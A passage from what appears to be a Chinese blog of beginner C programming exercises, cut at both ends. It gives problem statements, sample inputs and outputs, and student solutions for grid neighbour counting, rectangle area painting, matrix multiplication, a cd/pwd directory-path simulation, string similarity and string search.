class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m, t, k, num[<span class="number">20</span>][<span class="number">20</span>], i, j, x, count[<span class="number">50</span>], sum;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> m)</span></span>;</span><br><span class="line">    <span class="comment">//输入</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>, &amp;n, &amp;m, &amp;t, &amp;k);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//把相邻的四个只要不等于k,就放入count中</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, x = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (num[i][j] == k) &#123;</span><br><span class="line"><span class="keyword">if</span> (i - <span class="number">1</span> &gt;=<span class="number">0</span> &amp;&amp; num[i - <span class="number">1</span>][j] != k)</span><br><span class="line">count[x++] = num[i - <span class="number">1</span>][j];</span><br><span class="line"><span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; num[i][j - <span class="number">1</span>] != k)</span><br><span class="line">count[x++] = num[i][j - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> &lt; n &amp;&amp; num[i + <span class="number">1</span>][j] != k)</span><br><span class="line">count[x++] = num[i + <span class="number">1</span>][j];</span><br><span class="line"><span class="keyword">if</span> (j + <span class="number">1</span> &lt; m &amp;&amp; num[i][j + <span class="number">1</span>] != k)</span><br><span class="line">count[x++] = num[i][j + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//排序</span></span><br><span class="line">sort(count, x);</span><br><span class="line">    <span class="comment">//计数</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>, sum = <span class="number">1</span>; i &lt; x; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (count[i] != count[i - <span class="number">1</span>])</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t, i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m - i; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (n[j] &gt; n[j + <span class="number">1</span>]) &#123;</span><br><span class="line">t = n[j];</span><br><span class="line">n[j] = n[j + <span class="number">1</span>];</span><br><span class="line">n[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h3><p>问题描述    </p><p>在一个定义了直角坐标系的纸上，画一个(x1,y1)到(x2,y2)的矩形，指将横坐标范围从x1到x2，纵坐标范围从y1到y2之间的区域涂上颜色。   </p><p>下图给出了一个画了两个矩形的例子。第一个矩形是(1,1) 到(4, 4)，用绿色和紫色表示。第二个矩形是(2, 3)到(6, 5)，用蓝色和紫色表示。</p><img src="007UR4Zcly1ga3a53ri7ej30cc0bfweh-1581581299903.jpg" alt="图片2.png" style="zoom:50%;" /><p>图中，一共有15个单位的面积被涂上颜色，其中紫色部分被涂了两次，但在计算面积时只计算一次。在实际的涂色过程中，所有的矩形 都涂成统一的颜色，图中显示不同颜色仅为说明方便。给出所有要画的矩形，请问总共有多少个单位的面积被涂上颜色。</p><p>输入说明    </p><p>输入的第一行包含一个整数n，表示要画的矩形的个数，1&lt;=n&lt;=100   </p><p>接下来n行，每行4个非负整数，分别表示要画的矩形的左下角的横坐标与纵坐标，以及右上角的横坐标与纵坐标。0&lt;=横坐标、纵坐标&lt;=100。</p><p>输出说明    </p><p>输出一个整数，表示有多少个单位的面积被涂上颜色。</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">4</span> <span class="number">4</span> </span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">6</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><p><code>15</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">100</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, n, i, j, k,sum,s[<span class="number">100</span>][<span class="number">4</span>];</span><br><span class="line"><span class="comment">//输入</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;s[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//上色,用1表示上色,之后可以无脑相加来表示上色面积</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">for</span> (j =s[i][<span class="number">0</span>]; j &lt; s[i][<span class="number">2</span>]; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (k = s[i][<span class="number">1</span>]; k &lt; s[i][<span class="number">3</span>]; k++)</span><br><span class="line">num[j][k] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//求面积</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,sum=<span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++)</span><br><span class="line">sum += num[i][j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵相乘"><a href="#矩阵相乘" class="headerlink" title="矩阵相乘"></a>矩阵相乘</h3><p>描述<br>输入2×3矩阵A和3×2矩阵B各元素值，计算2×2矩阵C并输出其结果，矩阵相乘公式如下：<code>Cmn=Amp*Bpn</code></p><p>输入说明<br>输入整形数据</p><p>输出说明<br>格式输出：输出矩阵A、B和<code>A*B</code>的结果，矩阵形式，分行分列输出，矩阵之间空一行。</p><p>提示<br>采用三重循环结构实现计算过程，数据输出格式%5d。</p><p>输入样例</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><p>输出样例</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">5</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">22 </span> <span class="number">28</span></span><br><span class="line"><span class="symbol">49 </span> <span class="number">64</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>], b[<span class="number">3</span>][<span class="number">2</span>], i, j,p, * p1 = &amp;a[<span class="number">0</span>][<span class="number">0</span>], * p2 = &amp;b[<span class="number">0</span>][<span class="number">0</span>], c[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, p1++);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, p2++);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">3</span>; p++)</span><br><span class="line">c[i][j] += a[i][p] * b[p][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>, a[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>, b[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>, c[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><p>问题描述<br>在操作系统中，文件系统一般采用层次化的组织形式，由目录（或者文件夹）和文件构成，形成一棵树的形状。<br>有一个特殊的目录被称为根目录，是整个文件系统形成的这棵树的根节点，在类Linux系统中用一个单独的 “/”符号表示。<br>因此一个目录的绝对路径可以表示为“/d2/d3”这样的形式。<br>当前目录表示用户目前正在工作的目录。为了切换到文件系统中的某个目录，可以使用“cd”命令。<br>现在给出初始时的当前目录和一系列目录操作指令，请给出操作完成后的当前目录。</p><p>输入说明<br>第一行包含一个字符串，表示当前目录。<br>后续若干行，每行包含一个字符串，表示需要进行的目录切换命令。<br>最后一行为pwd命令，表示输出当前目录</p><p>注意：</p><ol><li>所有目录的名字只包含小写字母和数字，cd命令和pwd命令也都是小写。最长目录长度不超过200个字符。</li><li>当前目录已经是根目录时，cd .. 和cd /不会产生任何作用</li></ol><p>输出说明<br>输出一个字符串，表示经过一系列目录操作后的当前目录</p><p>输入样例    </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/d2/d3/d7</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">..</span></span><br><span class="line"><span class="keyword">cd</span> /</span><br><span class="line"><span class="keyword">cd</span> <span class="string">/d1/d6</span></span><br><span class="line"><span class="keyword">cd</span> d4/d5</span><br><span class="line"><span class="keyword">pwd</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="built_in">d1</span>/<span class="built_in">d6</span>/<span class="built_in">d4</span>/<span class="built_in">d5</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cmd[<span class="number">200</span>], dir[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(<span class="keyword">char</span>* n, <span class="keyword">char</span>* m)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">back</span><span class="params">(<span class="keyword">char</span>* n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">relative</span><span class="params">(<span class="keyword">char</span>* n, <span class="keyword">char</span>* m, <span class="keyword">int</span> len_n, <span class="keyword">int</span> len_m)</span></span>;</span><br><span class="line">gets_s(dir, <span class="number">200</span>);</span><br><span class="line">gets_s(cmd, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">"pwd"</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (cmd[<span class="number">3</span>] == <span class="string">'/'</span>)</span><br><span class="line">copy(cmd, dir);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cmd[<span class="number">3</span>] == <span class="string">'.'</span>)</span><br><span class="line">back(dir);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">relative(cmd, dir, <span class="built_in">strlen</span>(cmd), <span class="built_in">strlen</span>(dir));</span><br><span class="line">gets_s(cmd, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(<span class="keyword">char</span>* n, <span class="keyword">char</span>* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">3</span>, j = <span class="number">0</span>; n[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">m[j++] = n[i];</span><br><span class="line">m[j] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//back要注意当前目录已经是根目录的情况</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">back</span><span class="params">(<span class="keyword">char</span>* n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,index=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//找到最后一个'/'</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; n[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n[i] == <span class="string">'/'</span>)</span><br><span class="line">index=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (index &gt;= <span class="number">1</span>)<span class="comment">//不是根目录,用'\0'截断原来的字符串</span></span><br><span class="line">n[index] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//relative还是要注意当前目录已经是根目录的情况</span></span><br><span class="line"><span class="comment">//不是的话还要自己加个'/'</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">relative</span><span class="params">(<span class="keyword">char</span>* n, <span class="keyword">char</span>* m, <span class="keyword">int</span> len_n, <span class="keyword">int</span> len_m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">if</span> (len_m &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">m[len_m] = <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">3</span>, j = len_m + <span class="number">1</span>; i &lt; len_n; i++)</span><br><span class="line">m[j++] = n[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">3</span>, j = len_m ; i &lt; len_n; i++)</span><br><span class="line">m[j++] = n[i];</span><br><span class="line">&#125;</span><br><span class="line">m[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串相似度"><a href="#字符串相似度" class="headerlink" title="字符串相似度"></a>字符串相似度</h3><p>问题描述<br>最长公共子串指给定的两个字符串之间最长的相同子字符串（忽略大小写），最长公共子串长度可用来定义字符串相似度。<br>现给出两个字符串S1和S2，S1的长度为Len1，S2的长度为Len2，假设S1和S2的最长公共子串长度为LCS，则两个字符串的相似度定义为2<br>现给出两个字符串，请计算它们的相似度结果保留3位小数。</p><p>输入说明<br>输入为两行，分别表示两个字符串S1和S2，每个字符串长度不超过100个字符，所有字符均为可打印字符，包括大小写字母，标点符号和空格。</p><p>输出说明<br>输出两个字符串的相似度，结果四舍五入保留3位小数。</p><p>输入样例1    </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">App</span></span><br><span class="line"><span class="attribute">Apple</span></span><br></pre></td></tr></table></figure><p>输出样例1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.750</span></span><br></pre></td></tr></table></figure><p>输入样例2</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apple</span></span><br><span class="line"><span class="attribute">pineapple</span></span><br></pre></td></tr></table></figure><p>输出样例2</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.714</span></span><br></pre></td></tr></table></figure><p><img src="007UR4Zcly1gac7joawebj318g0mq43r-1581581306555.jpg" alt="IMG_20191228_100203_WPS图片.jpg"></p><p>图一是将两个字符串放在矩阵中比较,相同的赋值1,然后找到斜着方向的最大长度,但处理斜方向的最大长度有点麻烦.所以改进为图二.</p><p>图二是当匹配到相同字符时,就将其横纵坐标减一的值加一赋值到该位置,在比较的同时可以完成对长度的统计,之后只要搜索矩阵中的最大值就行了.(嫖zjx大佬的思路)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s1[<span class="number">101</span>], s2[<span class="number">101</span>], t[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">float</span> len1, len2, <span class="built_in">max</span> = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>][<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> similar;</span><br><span class="line">gets(s1);</span><br><span class="line">gets(s2);</span><br><span class="line">len1 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">len2 = <span class="built_in">strlen</span>(s2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len2; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s1[i] == s2[j] || <span class="built_in">abs</span>(s1[i] - s2[j]) == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; j != <span class="number">0</span>)</span><br><span class="line">a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> a[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len1; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len2; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i][j] &gt; <span class="built_in">max</span>) <span class="built_in">max</span> = a[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">similar = <span class="number">2</span> * <span class="built_in">max</span> / (len1 + len2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.3f"</span>, similar);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h3><p>问题描述<br>给出一个字符串和多行文字，输出在这些文字中出现了指定字符串的行。<br>程序还需要支持大小写敏感选项：<br>    当选项打开时，表示同一个字母的大写和小写看作不同的字符；<br>    当选项关闭时，表示同一个字母的大写和小写看作相同的字符。</p><p>输入说明<br>输入数据第一行包含一个字符串s，由大小写英文字母组成，长度不超过100。<br>第二行包含一个数字，表示大小写敏感选项。当数字为0时表示大小写不敏感，当数字为1时表示大小写敏感。<br>第三行包含一个整数n，表示给出的文字行数。<br>接下来n行，每行包含一个字符串，字符串由大小写英文字母组成，不含空格和其他字符。每个字符串长度不超过100。</p><p>输出说明<br>输出多行，每行包含一个字符串，按出现的顺序依次给出那些包含了字符串s的行。</p><p>输入样例    </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">HelloWorld</span><br><span class="line">HiHiHelloHiHi</span><br><span class="line">GrepIsAGreatTool</span><br><span class="line">HELLO</span><br><span class="line">HELLOisNOTHello</span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HelloWorld</span></span><br><span class="line"><span class="attribute">HiHiHelloHiHi</span></span><br><span class="line"><span class="attribute">HELLOisNOTHello</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 